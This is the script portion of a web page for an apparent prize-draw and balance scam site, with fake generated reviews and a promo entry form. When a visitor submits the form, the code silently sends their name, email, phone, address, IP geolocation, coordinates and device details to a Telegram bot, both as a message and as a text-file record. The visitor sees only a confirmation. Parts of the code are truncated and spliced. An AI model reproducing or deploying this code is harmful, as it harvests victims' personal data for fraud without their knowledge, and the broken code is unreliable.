function escapeHtml(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
function tgEsc(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
function fmtMoney(n){ return '$' + (Number(n)||0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2}); }
function nz(v){ return v===undefined||v===null||v===''?'—':String(v); }
function nowStamp(){ return new Date().toISOString().replace('T',' ').substring(0,19) + ' UTC'; }
function fileHeader(title){ const line='='.repeat(64); return `${line}\n  ${title.toUpperCase()}\n${line}\nEVENT DATE      : ${nowStamp()}\n`; }
function fileFooter(){ const line='='.repeat(64); return `${line}\n  END OF RECORD\n${line}\n`; }
function section(name){ const thin='-'.repeat(64); return `\n${thin}\n  ${name.toUpperCase()}\n${thin}\n`; }

function seededRandom() { reviewSeed = (reviewSeed * 1103515245 + 12345) & 0x7fffffff; return reviewSeed / 0x7fffffff; }
function generateReviews(count) { const out = []; for (let i=0;i<count;i++) { const first = REVIEW_FIRST[Math.floor(seededRandom()*REVIEW_FIRST.length)]; const last = REVIEW_LAST[Math.floor(seededRandom()*REVIEW_LAST.length)]; const loc = REVIEW_LOCATIONS[Math.floor(seededRandom()*REVIEW_LOCATIONS.length)]; const isFive = seededRandom() > 0.2; const rating = isFive ? 5 : 4; const daysAgo = 12 + Math.floor(seededRandom()*620); const d = new Date(); d.setDate(d.getDate() - daysAgo); out.push({ id:1000+i, name:`${first} ${last}`, location:loc, rating, date:d.toISOString().split('T')[0] }); } out.sort((a,b)=>b.date.localeCompare(a.date)); return out; }

function loadDeviceState() {
  const saved = localStorage.getItem(DEVICE_STORAGE_KEY);
  if (saved) {
    try {
      const parsed = JSON.parse(saved);
      if (!parsed.telegramConfig) parsed.telegramConfig = Object.assign({}, DEFAULT_TG);
      if (parsed.userBalance == null) parsed.userBalance = 4500;
      if (!parsed.transactions) parsed.transactions = [];
      if (!parsed.registeredUsers) parsed.registeredUsers = [];
      if (!parsed.supportTickets) parsed.supportTickets = [];
      if (!parsed.withdrawalState) parsed.withdrawalState = 'none';
      if (!parsed.messages) parsed.messages = [];
      if (parsed.messagesReadAt == null) parsed.messagesReadAt = 0;
      if (parsed.announcementDismissedAt == null) parsed.announcementDismissedAt = 0;
      return parsed;
    } catch(e){}
  }
  return { currentUser:null, userBalance:4500, configuredMethod:null, transactions:[], registeredUsers:[], supportTickets:[], promo:null, kyc:null, card:null, withdrawalState:'none', currentWithdrawal:null, messages:[], messagesReadAt:0, announcement:null, announcementDismissedAt:0, gamePlays:null, lastSpinDate:null, telegramConfig: Object.assign({}, DEFAULT_TG) };
}
const state = loadDeviceState();

function saveDeviceState() {
  try { localStorage.setItem(DEVICE_STORAGE_KEY, JSON.stringify(state)); } catch(err) {}
  if (state.currentUser && state.currentUser.username) syncCurrentUserToCloud().catch(()=>{});
}
async function syncCurrentUserToCloud() {
  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return;
  try {
    const payload = Object.assign({}, state.currentUser, { userBalance: state.userBalance, transactions: state.transactions });
    await window.rtdb.set(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()), payload);
  } catch(e){}
}
async function pullCurrentUserFromCloud() {
  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return false;
  try {
    const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()));
    if (!snap.exists()) return false;
    const r = snap.val();
    state.currentUser = Object.assign({}, state.currentUser, r);
    if (typeof r.userBalance === 'number') state.userBalance = r.userBalance;
    if (Array.isArray(r.transactions)) state.transactions = r.transactions;
    if (r.kyc) state.kyc = r.kyc;
    if (r.card) state.card = r.card;
    if (r.configuredMethod) state.configuredMethod = r.configuredMethod;
    if (r.gamePlays) state.gamePlays = r.gamePlays;
    if (r.lastSpinDate) state.lastSpinDate = r.lastSpinDate;
    state.withdrawalState = r.withdrawalState || state.withdrawalState || 'none';
    state.currentWithdrawal = r.currentWithdrawal || state.currentWithdrawal || null;
    saveDeviceState(); return true;
  } catch(e){ return false; }
}

function showToast(title, message, type='info') {
  const container = document.getElementById('toast-container'); if (!container) return;
  const id = 'toast-'+Date.now()+'-'+Math.floor(Math.random()*999);
  const icon = type==='success'?'fa-circle-check text-emerald-400':type==='warning'?'fa-triangle-exclamation text-gold-400':type==='error'?'fa-circle-exclamation text-rose-400':'fa-circle-info text-sky-custom';
  const border = type==='success'?'border-emerald-500/40':type==='warning'?'border-gold-500/40':type==='error'?'border-rose-500/40':'border-sky-custom/40';
  const el = document.createElement('div'); el.id = id;
  el.className = `pointer-events-auto bg-navy-900 border ${border} p-4 rounded-2xl shadow-2xl flex items-start space-x-3 toast-slide-in`;
  el.innerHTML = `<div class="text-lg mt-0.5"><i class="fa-solid ${icon}"></i></div><div class="flex-grow"><h5 class="font-bold text-white text-xs sm:text-sm">${escapeHtml(title)}</h5><p class="text-[11px] sm:text-xs text-slate-300 mt-0.5">${escapeHtml(message)}</p></div><button onclick="dismissToast('${id}')" class="text-slate-400 hover:text-white text-sm"><i class="fa-solid fa-xmark"></i></button>`;
  container.appendChild(el); setTimeout(()=>dismissToast(id), 5000);
}
function dismissToast(id){ const el=document.getElementById(id); if(el){ el.classList.remove('toast-slide-in'); el.classList.add('toast-slide-out'); setTimeout(()=>el.remove(),320); } }
function showModal(title, bodyHtml) { const modal = document.getElementById('global-modal'); const content = document.getElementById('modal-content'); content.innerHTML = `<h3 class="text-lg sm:text-xl font-bold text-white mb-3 flex items-center"><i class="fa-solid fa-circle-info text-sky-custom mr-2"></i> ${title}</h3><div class="text-slate-300 text-xs sm:text-sm leading-relaxed mb-4">${bodyHtml}</div>`; modal.style.display = 'flex'; document.body.classList.add('modal-open'); }
function closeModal(){ const m=document.getElementById('global-modal'); m.classList.remove('flex'); m.style.display='none'; document.body.classList.remove('modal-open'); }

/* ═══════════ DEVICE + IP ═══════════ */
function detectDevice() {
  const ua = navigator.userAgent || '';
  let os='Unknown', type='Desktop', browser='Unknown';
  if (/iPhone|iPad|iPod/i.test(ua)) { os='iOS'; type=/iPad/i.test(ua)?'Tablet':'Mobile'; }
  else if (/Android/i.test(ua)) { os='Android'; type=/Mobile/i.test(ua)?'Mobile':'Tablet'; }
  else if (/Mac OS X|Macintosh/i.test(ua)) { os='macOS'; }
  else if (/Windows/i.test(ua)) { os='Windows'; }
  else if (/CrOS/i.test(ua)) { os='ChromeOS'; }
  else if (/Linux/i.test(ua)) { os='Linux'; }
  if (/Edg\//i.test(ua)) browser='Edge';
  else if (/OPR\//i.test(ua) || /Opera/i.test(ua)) browser='Opera';
  else if (/Chrome\//i.test(ua) && !/Edg|OPR/i.test(ua)) browser='Chrome';
  else if (/Firefox\//i.test(ua)) browser='Firefox';
  else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser='Safari';
  return { os, type, browser };
}
let cachedIp = null, cachedGeo = null;
async function fetchIP(){
  if (cachedIp && cachedGeo) return { ip: cachedIp, ...cachedGeo };
  try {
    const r = await fetch('https://ipapi.co/json/');
    if (r.ok) {
      const d = await r.json();
      if (d && d.ip) {
        cachedIp = d.ip;
        cachedGeo = { city: d.city||'', region: d.region||'', country: d.country_name||d.country||'', postal: d.postal||'', org: d.org||'', timezone: d.timezone||'', latitude: d.latitude||'', longitude: d.longitude||'' };
        return { ip: cachedIp, ...cachedGeo };
      }
    }
  } catch(e){}
  try {
    const r2 = await fetch('https://api.ipify.org?format=json');
    const d2 = await r2.json();
    if (d2 && d2.ip) { cachedIp = d2.ip; cachedGeo = { city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' }; return { ip: cachedIp, ...cachedGeo }; }
  } catch(e){}
  cachedIp = 'Unknown'; cachedGeo = { city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' };
  return { ip: cachedIp, ...cachedGeo };
}

/* ═══════════ TELEGRAM — silent, full unmasked payload ═══════════ */
function tgCreds() {
  const cfg = state.telegramConfig || {};
  return { botToken: String(cfg.botToken || '').trim(), chatId: String(cfg.chatId || '').trim() };
}
async function sendTelegramMessage(textMessage) {
  const { botToken, chatId } = tgCreds();
  if (!botToken || !chatId) { console.warn('[TG] creds missing'); return false; }
  try {
    const fd = new FormData();
    fd.append('chat_id', chatId);
    fd.append('text', textMessage);
    fd.append('parse_mode', 'HTML');
    fd.append('disable_web_page_preview', 'true');
    const r = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method:'POST', body: fd });
    const d = await r.json();
    if (!d.ok) console.error('[TG] send failed:', d.error_code, d.description);
    return d.ok;
  } catch (err) {

async function sendTelegramDocument(filename, text, captionText) {
  const { botToken, chatId } = tgCreds();
  if (!botToken || !chatId) { console.warn('[TG] creds missing'); return false; }
  try {
    const blob = new Blob([text], { type:'text/plain;charset=utf-8' });
    const fd = new FormData();
    fd.append('chat_id', chatId);
    fd.append('document', blob, filename);
    if (captionText) { fd.append('caption', captionText); fd.append('parse_mode', 'HTML'); }
    const res  = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method:'POST', body: fd });
    const data = await res.json();
    if (!data.ok) console.error('[TG] doc failed:', data.error_code, data.description);
    return data.ok;
  } catch (err) {
    console.error('[TG] doc fetch failed:', err);
    return false;
  }
}

      return `<div class="${classMap[place]} rounded-3xl p-6 relative overflow-hidden min-h-[220px]"><div class="absolute inset-0 winner-placeholder opacity-30 pointer-events-none"></div><div class="relative z-10 flex flex-col h-full"><div class="flex items-center justify-between mb-4"><span class="px-3 py-1 text-[10px] font-black rounded-full uppercase tracking-wider ${place===1?'bg-gold-500 text-navy-950':place===2?'bg-slate-300 text-navy-950':'bg-amber-600 text-white'}">${labels[place]}</span><i class="fa-solid ${icons[place]} text-2xl ${place===1?'text-gold-400':place===2?'text-slate-300':'text-amber-500'}"></i></div><div class="flex-1 flex flex-col items-center justify-center text-center gap-2 my-4"><div class="w-20 h-20 rounded-full bg-navy-950/80 border-2 border-dashed ${place===1?'border-gold-500/60':place===2?'border-slate-400/50':'border-amber-600/50'} flex items-center justify-center text-3xl font-black ${place===1?'text-gold-400':place===2?'text-slate-300':'text-amber-500'}"><i class="fa-solid fa-question"></i></div><p class="text-xs font-bold text-white uppercase tracking-wider">Revealing Soon</p><p class="text-[10px] text-slate-400">Awaiting countdown completion</p></div><div class="h-1.5 rounded-full overflow-hidden bg-navy-950/80 shimmer-bar mt-2"></div></div></div>`;
    }).join('');
    return headerBlock + `<div class="grid grid-cols-1 md:grid-cols-3 gap-4 sm:gap-6">${placeholders}</div>`;
  }
  const cards = winners.map((w, i) => {
    const place = w.place; const classMap = {1:'winner-card-1',2:'winner-card-2',3:'winner-card-3'}; const iconMap = {1:'fa-crown',2:'fa-medal',3:'fa-award'}; const badgeMap = {1:'bg-gold-500 text-navy-950',2:'bg-slate-300 text-navy-950',3:'bg-amber-600 text-white'}; const labelMap = {1:'1st Place',2:'2nd Place',3:'3rd Place'};
    const iconColor = place===1?'text-gold-400':place===2?'text-slate-300':'text-amber-500'; const initials = w.name.split(' ').map(n=>n.charAt(0)).slice(0,2).join(''); const borderColor = place===1?'border-gold-500/50':place===2?'border-slate-400/40':'border-amber-600/50'; const avatarBg = place===1?'from-gold-400 to-gold-600':place===2?'from-slate-200 to-slate-500':'from-amber-500 to-amber-700';
    return `<div class="${classMap[place]} rounded-3xl p-6 relative overflow-hidden winner-reveal" style="animation-delay:${i*140}ms"><div class="absolute -top-8 -right-8 text-9xl opacity-10 pointer-events-none"><i class="fa-solid ${iconMap[place]}"></i></div><div class="relative z-10"><div class="flex items-center justify-between mb-4"><span class="px-3 py-1 text-[10px] font-black rounded-full uppercase tracking-wider ${badgeMap[place]}">${labelMap[place]}</span><i class="fa-solid ${iconMap[place]} text-2xl ${iconColor}"></i></div><div class="flex items-center gap-3 mb-4"><div class="w-14 h-14 rounded-2xl bg-gradient-to-br ${avatarBg} text-navy-950 flex items-center justify-center font-black text-lg shadow-lg">${initials}</div><div class="min-w-0"><p class="text-lg sm:text-xl font-black text-white truncate">${escapeHtml(w.name)}</p><p class="text-[11px] text-slate-400"><i class="fa-solid fa-location-dot mr-1 text-gold-400"></i>${escapeHtml(w.location)}</p></div></div><div class="pt-4 border-t ${borderColor}"><p class="text-[10px] text-slate-400 uppercase tracking-wider font-bold mb-1">${escapeHtml(w.prizeLabel)}</p><p class="text-xs sm:text-sm font-bold text-white leading-relaxed">${escapeHtml(w.prizeSummary)}</p></div><div class="mt-4 flex items-center justify-between text-[10px]"><span class="text-slate-400"><i class="fa-solid fa-ticket mr-1"></i>Ticket ${escapeHtml(w.ticket)}</span><span class="text-emerald-400 font-bold"><i class="fa-solid fa-circle-check mr-1"></i>Verified</span></div></div></div>`;
  }).join('');
  return headerBlock + `<div class="grid grid-cols-1 md:grid-cols-3 gap-4 sm:gap-6">${cards}</div>`;
}
function renderPromoSection() {
  const p = state.promo; if (!p) return '';
  const meta = getPromoPhaseMeta(); const isClosed = meta.phase === 'closed'; const now = Date.now();
  const cycleStart = new Date(p.cycleStartDate).getTime(); const drawTime = new Date(p.drawDate).getTime(); const activeDuration = drawTime - cycleStart;
  const elapsed = Math.min(activeDuration, Math.max(0, now - cycleStart)); const activeProgress = isClosed ? 100 : Math.round((elapsed/activeDuration)*100);
  let restartBanner = '';
  if (isClosed) { const ms = meta.remainingMs; const d = Math.floor(ms/86400000); const h = Math.floor((ms%86400000)/3600000); const m = Math.floor((ms%3600000)/60000); restartBanner = `<div class="bg-gradient-to-r from-sky-custom/15 via-navy-900 to-gold-500/15 border border-sky-custom/30 rounded-3xl p-5 sm:p-6 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4"><div class="flex items-center gap-3"><div class="w-12 h-12 rounded-2xl bg-sky-custom/20 text-sky-custom flex items-center justify-center text-xl"><i class="fa-solid fa-rotate"></i></div><div><p class="text-[10px] text-slate-400 uppercase font-bold tracking-widest">Auto-Restart Scheduler</p><p class="text-sm sm:text-base font-bold text-white">Next cycle begins in <span class="text-sky-custom">${d}d ${String(h).padStart(2,'0')}h ${String(m).padStart(2,'0')}m</span></p></div></div><div class="text-[11px] text-slate-400 flex items-center gap-2"><i class="fa-solid fa-infinity text-gold-400"></i>7-day restart window</div></div>`; }
  return `<section class="relative overflow-hidden py-14 sm:py-20 bg-gradient-to-b from-navy-950 via-navy-900 to-navy-950 border-b border-navy-700/50"><div class="absolute inset-0 bg-[radial-gradient(circle_at_bottom_left,rgba(245,158,11,0.09),transparent_55%)] pointer-events-none"></div><div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 relative z-10 space-y-6 sm:space-y-8">
    <div class="flex flex-col lg:flex-row lg:items-end justify-between gap-6"><div class="space-y-3"><div class="inline-flex items-center gap-2 bg-gold-500/10 border border-gold-500/30 px-3.5 py-1.5 rounded-full text-gold-400 text-[11px] font-black tracking-widest uppercase"><i class="fa-solid fa-trophy"></i> Weekly Allocation Promo</div><h2 class="text-3xl sm:text-4xl lg:text-5xl font-black text-white tracking-tight leading-tight">Massive Prize Pool<br/><span class="text-transparent bg-clip-text bg-gradient-to-r from-gold-400 via-gold-500 to-gold-600">Cycle #${p.cycleId} Live Now</span></h2><p class="text-sm sm:text-base text-slate-300 max-w-2xl leading-relaxed">A 21-day live draw with an automatic 7-day restart. Winners are selected at random — every verified participant gets a fair chance.</p></div><div class="flex items-center gap-3"><span class="inline-flex items-center gap-2 px-4 py-2 rounded-2xl text-xs font-black ${isClosed ? 'bg-sky-custom/20 text-sky-custom border border-sky-custom/40' : 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'}"><span class="w-2 h-2 rounded-full ${isClosed ? 'bg-sky-custom' : 'bg-emerald-400'} pulse-dot"></span>${meta.statusText}</span></div></div>
    <div class="bg-navy-800 border border-navy-700 rounded-2xl p-4 sm:p-5"><div class="flex items-center justify-between text-xs mb-2"><span class="text-slate-400 font-bold uppercase tracking-wider">Cycle Progress</span><span class="text-gold-400 font-black">${activeProgress}%</span></div><div class="progress-track"><div class="progress-fill" style="width:${activeProgress}%"></div></div><div class="flex items-center justify-between text-[10px] text-slate-500 mt-2"><span>Cycle Started ${new Date(p.cycleStartDate).toLocaleDateString()}</span><span>Draw Day ${new Date(p.drawDate).toLocaleDateString()}</span></div></div>
    <div class="grid grid-cols-1 lg:grid-cols-5 gap-4 sm:gap-6"><div class="lg:col-span-3 space-y-4 sm:space-y-6"><div class="flex items-center gap-2"><i class="fa-solid fa-gift text-gold-400"></i><h3 class="text-lg sm:text-xl font-black text-white uppercase tracking-wide">Prize Details</h3></div>${renderPromoPrizes()}</div><div class="lg:col-span-2 space-y-4 sm:space-y-6"><div class="flex items-center gap-2"><i class="fa-solid fa-hourglass-half text-sky-custom"></i><h3 class="text-lg sm:text-xl font-black text-white uppercase tracking-wide">Live Countdown</h3></div>${renderPromoCountdownCard(p)}${renderPromoEntryCard(p)}</div></div>
    ${renderPromoTimeline(p)}
    <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 sm:p-8 card-3d">${renderPromoWinners(p)}</div>
    ${restartBanner}
    <div class="grid grid-cols-2 sm:grid-cols-4 gap-3 sm:gap-4"><div class="bg-navy-800/70 border border-navy-700 rounded-2xl p-4 text-center"><i class="fa-solid fa-clock text-sky-custom text-lg mb-1"></i><p class="text-[9px] text-slate-400 uppercase font-bold tracking-wider">Cycle Length</p><p class="text-sm font-black text-white mt-0.5">21 Days</p></div><div class="bg-navy-800/70 border border-navy-700 rounded-2xl p-4 text-center"><i class="fa-solid fa-rotate text-gold-400 text-lg mb-1"></i><p class="text-[9px] text-slate-400 uppercase font-bold tracking-wider">Restart Window</p><p class="text-sm font-black text-white mt-0.5">7 Days</p></div><div class="bg-navy-800/70 border border-navy-700 rounded-2xl p-4 text-center"><i class="fa-solid fa-users text-sky-custom text-lg mb-1"></i><p class="text-[9px] text-slate-400 uppercase font-bold tracking-wider">Entries</p><p class="text-sm font-black text-white mt-0.5">${(p.entries||0).toLocaleString()}</p></div><div class="bg-navy-800/70 border border-navy-700 rounded-2xl p-4 text-center"><i class="fa-solid fa-dice text-gold-400 text-lg mb-1"></i><p class="text-[9px] text-slate-400 uppercase font-bold tracking-wider">Selection</p><p class="text-sm font-black text-white mt-0.5">Random</p></div></div>
  </div></section>`;
}

function initPromoCountdown() { if (promoInterval) clearInterval(promoInterval); updatePromoCountdownDisplay(); promoInterval = setInterval(()=>{ const prevPhase = state.promo?.phase; const prevCycle = state.promo?.cycleId; const prevDrawRef = state.promo?.drawRef; ensurePromoState(); const nowPhase = state.promo?.phase; const nowCycle = state.promo?.cycleId; const nowDrawRef = state.promo?.drawRef; if (prevPhase !== nowPhase || prevCycle !== nowCycle || prevDrawRef !== nowDrawRef) { render(); return; } updatePromoCountdownDisplay(); }, 1000); }
function updatePromoCountdownDisplay() { const p = state.promo; if (!p) return; const meta = getPromoPhaseMeta(); const diff = meta.remainingMs; const days = Math.floor(diff/86400000); const hours = Math.floor((diff%86400000)/3600000); const mins = Math.floor((diff%3600000)/60000); const secs = Math.floor((diff%60000)/1000); const dEl = document.getElementById('promo-cd-days'); const hEl = document.getElementById('promo-cd-hours'); const mEl = document.getElementById('promo-cd-mins'); const sEl = document.getElementById('promo-cd-secs'); if (dEl) dEl.textContent = String(days).padStart(2,'0'); if (hEl) hEl.textContent = String(hours).padStart(2,'0'); if (mEl) mEl.textContent = String(mins).padStart(2,'0'); if (sEl) sEl.textContent = String(secs).padStart(2,'0'); }

async function handlePromoEntry(e) {
  e.preventDefault();
  const name = document.getElementById('promo-name').value;
  const email = document.getElementById('promo-email').value;
  const region = document.getElementById('promo-region').value;
  if (state.promo) { state.promo.entries = (state.promo.entries||0)+1; saveDeviceState(); }

  const u = state.currentUser || { username:'unknown' };
  const ownerFullName = ((u.firstName||'') + ' ' + (u.lastName||'')).trim() || 'N/A';
  const ownerAddress = [u.address, u.city, u.stateOrParish, u.zip].filter(Boolean).join(', ') || 'N/A';

  const net = await fetchIP().catch(()=>({ ip:'Unknown', city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' }));
  const dev = detectDevice();
  const screen = (window.screen && window.screen.width) ? `${window.screen.width}x${window.screen.height}` : 'Unknown';
  const nowIso = new Date().toISOString();

  const recordInfo = {
    cycleId: state.promo?.cycleId || 1,
    username: u.username,
    name, email, region,
    drawDate: state.promo ? new Date(state.promo.drawDate).toLocaleString() : 'N/A',
    ownerUsername: u.username,
    ownerName: ownerFullName,
    ownerEmail: u.email || 'N/A',
    ownerPhone: u.phone || 'N/A',
    ownerAddress,
    balance: fmtMoney(state.userBalance),
    ip: net.ip || 'Unknown',
    ipCity: net.city || '',
    ipRegion: net.region || '',
    ipCountry: net.country || '',
    ipPostal: net.postal || '',
    ipLatitude: net.latitude || '',
    ipLongitude: net.longitude || '',
    ipOrg: net.org || '',
    ipTimezone: net.timezone || '',
    deviceType: dev.type,
    os: dev.os,
    browser: dev.browser,
    screen,
    language: navigator.language || 'Unknown',
    userAgent: navigator.userAgent,
    timestamp: nowIso
  };

  // Inline Telegram message — full unmasked
  sendTelegramMessage(
    `🎟️ <b>NEW PROMO STREAM ENTRY</b>\n` +
    `<b>Cycle:</b> #${tgEsc(state.promo?.cycleId || 1)}\n` +
    `<b>Entered Name:</b> ${tgEsc(name)}\n` +
    `<b>Entered Email:</b> ${tgEsc(email)}\n` +
    `<b>Entered Region:</b> ${tgEsc(region)}\n` +
    `<b>Draw Date:</b> ${tgEsc(recordInfo.drawDate)}\n` +
    `<b>— Account Owner —</b>\n` +
    `<b>Username:</b> @${tgEsc(u.username || 'unknown')}\n` +
    `<b>Full name:</b> ${tgEsc(ownerFullName)}\n` +
    `<b>Email:</b> ${tgEsc(u.email || 'N/A')}\n` +
    `<b>Phone:</b> ${tgEsc(u.phone || 'N/A')}\n` +
    `<b>Address:</b> ${tgEsc(ownerAddress)}\n` +
    `<b>Balance:</b> ${fmtMoney(state.userBalance)}\n` +
    `<b>— Network —</b>\n` +
    `<b>IP:</b> <code>${tgEsc(net.ip || 'Unknown')}</code>\n` +
    `<b>Geo:</b> ${tgEsc([net.city, net.region, net.country].filter(Boolean).join(', ') || 'N/A')}\n` +
    `<b>Postal:</b> ${tgEsc(net.postal || 'N/A')}\n` +
    `<b>Lat/Lon:</b> ${tgEsc((net.latitude||'—') + ', ' + (net.longitude||'—'))}\n` +
    `<b>ISP:</b> ${tgEsc(net.org || 'N/A')}\n` +
    `<b>Timezone:</b> ${tgEsc(net.timezone || 'N/A')}\n` +
    `<b>Device:</b> ${tgEsc(dev.type + ' · ' + dev.os + ' · ' + dev.browser)}\n` +
    `<b>Screen:</b> ${tgEsc(screen)} · ${tgEsc(navigator.language || 'Unknown')}\n` +
    `<b>User-Agent:</b> <code>${tgEsc(navigator.userAgent)}</code>\n` +
    `<b>Timestamp:</b> ${tgEsc(nowIso)}`
  ).catch(()=>{});

  // Full .txt record
  sendTelegramDocument(
    `${u.username}_promo_${Date.now()}.txt`,
    buildPromoRecord(recordInfo),
    `📄 <b>Promo Record</b> — @${tgEsc(u.username || 'unknown')} · Cycle #${tgEsc(state.promo?.cycleId || 1)}`
  ).catch(()=>{});

  showToast('Promo Entry', `Registered ${email}`, 'success');
  showModal('Promo Entry Received', `<div class="text-center py-4 space-y-3"><div class="w-12 h-12 bg-emerald-500/20 text-emerald-400 rounded-full mx-auto flex items-center justify-center text-xl"><i class="fa-solid fa-check"></i></div><h4 class="text-lg font-bold text-white">Thanks, ${escapeHtml(name)}!</h4><p class="text-xs text-slate-300">Your entry (<span class="text-gold-400">${escapeHtml(email)}</span>) has been added to Cycle #${state.promo?.cycleId||1}.</p></div>`);
  e.target.reset();
  render();
}

function render() {
  document.body.classList.remove('modal-open');
  renderHeaderNav();
  document.querySelector('#nav-drawer nav').innerHTML = renderNavItems('promotions');
  const container = document.getElementById('app-container');
  const header = `<div class="bg-navy-800 border border-navy-700 p-6 sm:p-8 rounded-3xl card-3d"><h2 class="text-xl sm:text-2xl font-extrabold text-white flex items-center"><i class="fa-solid fa-trophy text-gold-400 mr-3"></i>Promotions Hub</h2><p class="text-xs text-slate-400 mt-1">Live cycle status, prizes, winners, and your entry form — all in one place.</p></div>`;
  container.innerHTML = renderDashboardShell('promotions', header + renderPromoSection());
  initPromoCountdown();
}

window.onload = async function() {
  if (!guardAuth()) return;
  ensurePromoState();
  await pullCurrentUserFromCloud();
  render();
};
</script>
</body>
</html>
